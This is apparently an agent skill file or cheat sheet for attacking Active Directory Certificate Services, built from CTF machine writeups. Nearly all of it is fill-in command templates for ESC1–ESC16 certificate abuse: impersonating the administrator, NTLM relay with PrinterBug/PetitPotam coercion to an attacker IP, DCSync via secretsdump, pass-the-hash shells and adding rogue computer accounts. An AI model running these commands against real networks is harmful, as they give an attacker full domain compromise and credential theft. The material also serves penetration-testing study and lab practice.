---
name: adcs
description: ADCS exploitation based on 0xdf writeups of Escape, TombWatcher, Fluffy, Mist, Authority, Manager, EscapeTwo, Retro, VulnCicada.
---

# ADCS Exploitation

## Enumerate first
```bash
# Presence check
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M adcs

# Full vulnerability scan
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -vulnerable -stdout
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -stdout   # see all templates

# BloodHound ADCS data (requires rusthound-ce)
rusthound-ce -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {IP} --zip
```

## ESC decision tree
```
enrolleesuppliessubject=true + authenticationenabled=true
  + enrollable by current user/group → ESC1

enrollment agent template available
  + can request on behalf of others → ESC3

GenericAll/WriteOwner on template
  → modify to ESC1-vulnerable → ESC4

CA has ManageCA or ManageCertificates right
  → ESC7 (add enrollment officer or approve failed requests)

CA vulnerable to relay (web enrollment enabled, no EPA)
  → ESC8 (PetitPotam/PrinterBug + ntlmrelayx + certipy)

GenericWrite over user + no strong mapping enforced
  → set UPN to administrator → ESC10

GenericWrite over CA computer + no strong mapping
  → set UPN → ESC16

schemaVersion=1 template + can set application policy
  → inject Client Authentication EKU → ESC15

template has issuance policy OID linked to group with high privilege
  → ESC13
```

## ESC1 — Enroll as anyone (enrolleesuppliessubject=true)
```bash
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TEMPLATE}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
# → NT hash for administrator
```

## ESC3 — Enrollment agent
```bash
# Step 1: get enrollment agent cert
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{AGENT_TEMPLATE}' -dc-ip {IP}
# Step 2: request cert on behalf of admin
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TARGET_TEMPLATE}' -on-behalf-of '{DOMAIN}\administrator' -pfx agent.pfx -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC4 — WriteOwner/GenericAll on template (EscapeTwo pattern)
```bash
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TEMPLATE}' -save-old
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TEMPLATE}' -configuration {TEMPLATE}.json
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TEMPLATE}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TEMPLATE}' -configuration {TEMPLATE}.json.bak
```

## ESC7 — ManageCA right (Manager pattern)
```bash
# Add yourself as officer
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -add-officer {USER}
# Enable SubCA template
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -enable-template SubCA
# Request and approve
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template SubCA -upn administrator@{DOMAIN} -dc-ip {IP}
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -issue-request {REQUEST_ID}
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -retrieve {REQUEST_ID}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC8 — NTLM relay to web enrollment (VulnCicada pattern)
```bash
# Setup relay
certipy relay -ca {CA_IP} -template DomainController
# Coerce DC authentication (PrinterBug or PetitPotam)
python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{DC_FQDN} {ATTACKER_IP}
# impacket-petitpotam {ATTACKER_IP} {DC_IP}
# certipy will capture and get DC cert → DCSync
certipy auth -pfx {DC_HOSTNAME}.pfx -dc-ip {IP}
impacket-secretsdump -k -no-pass {DOMAIN}/{DC_HOSTNAME}$@{DC_IP}
```

## ESC10 — Weak mapping (GenericWrite over user)
```bash
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user {TARGET} -upn 'administrator' -dc-ip {IP}
certipy req -u '{TARGET}@{DOMAIN}' -p '{TARGET_PASS}' -ca '{CA}' -template User -dc-ip {IP}
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user {TARGET} -upn '{TARGET}@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}
```

## ESC13 — Issuance policy OID (Mist pattern)
```bash
# Check with: check-adcsesc13 or certipy find
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TEMPLATE}' -dc-ip {IP}
certipy auth -pfx {USER}.pfx -dc-ip {IP}
```

## ESC15 — Arbitrary application policy schemaVersion 1 (TombWatcher pattern)
```bash
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TEMPLATE}' -application-policies 'Client Authentication' -upn 'administrator@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC16 — UPN override, GenericWrite over CA computer (Fluffy pattern)
```bash
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user '{CA_COMPUTER}$' -upn 'administrator' -dc-ip {IP}
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template Machine -dc-ip {IP}
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user '{CA_COMPUTER}$' -upn '{CA_COMPUTER}$@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}
```

## ESC1 via computer account (Authority/Retro pattern)
```bash
# When template enrollable by Domain Computers, not users
# Add fake computer to domain first
impacket-addcomputer {DOMAIN}/{USER}:'{PASS}' -computer-name 'FAKE$' -computer-pass 'FakePass123!'
certipy req -u 'FAKE$@{DOMAIN}' -p 'FakePass123!' -ca '{CA}' -template '{TEMPLATE}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## After certipy auth (all ESCs)
```bash
# Returns NT hash → PTH
evil-winrm -i {IP} -u administrator -H {NT_HASH}

# Or use TGT
export KRB5CCNAME=administrator.ccache
impacket-psexec {DOMAIN}/administrator@{DC_FQDN} -k -no-pass

# LDAP shell when LDAP signing blocks normal auth
certipy auth -pfx administrator.pfx -dc-ip {IP} -ldap-shell
```

## Pass-the-cert (Authority pattern)
```bash
# When cert doesn't work directly for auth
certipy auth -pfx administrator.pfx -dc-ip {IP}
# If that fails, try pass-the-cert with passthecert.py
python3 passthecert.py -action whoami -crt administrator.crt -key administrator.key -domain {DOMAIN} -dc-ip {IP}
```

## Rabbit holes
- `authenticationenabled=false` → cannot be used for AD auth, skip
- gMSA Kerberoasting → 256-bit random, not crackable
- `IsUserSpecifiesSanEnabled=false` → ESC6 not active
- Template shows vulnerable but you're not in enrollee group → find path to enrollment first